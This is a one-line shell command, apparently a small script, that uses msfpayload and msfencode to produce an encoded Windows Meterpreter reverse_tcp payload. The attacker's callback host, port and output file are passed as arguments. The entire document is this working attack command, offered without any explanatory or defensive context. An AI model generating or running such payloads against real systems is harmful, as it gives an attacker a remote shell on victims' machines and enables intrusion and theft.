msfpayload windows/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 R | msfencode -o $3
